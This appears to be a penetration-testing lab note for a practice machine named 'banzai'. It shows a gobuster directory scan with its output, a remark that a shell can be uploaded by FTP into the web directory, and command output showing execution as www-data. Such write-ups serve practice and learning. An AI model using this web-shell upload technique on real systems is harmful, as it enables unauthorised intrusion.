# 5 :8295 banzai

```
http://192.168.174.56:8295/
Banzai Landing Page

# teams
Walter White
Sarah Jhinson
William Anderson
Amanda Jepson

$ gobuster dir -u http://192.168.174.56:8295 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 80                                                                                                  
===============================================================
/index.php            (Status: 200) [Size: 23315]
/img                  (Status: 301) [Size: 321] [--> http://192.168.174.56:8295/img/]
/css                  (Status: 301) [Size: 321] [--> http://192.168.174.56:8295/css/]
/lib                  (Status: 301) [Size: 321] [--> http://192.168.174.56:8295/lib/]
/js                   (Status: 301) [Size: 320] [--> http://192.168.174.56:8295/js/]
/contactform          (Status: 301) [Size: 329] [--> http://192.168.174.56:8295/contactform/]
/server-status        (Status: 403) [Size: 281]

# this matched ftp dir
# can upload shell using ftp

CMD: whoami;id;hostname;uname -a
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
banzai
Linux banzai 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64 GNU/Linux
```
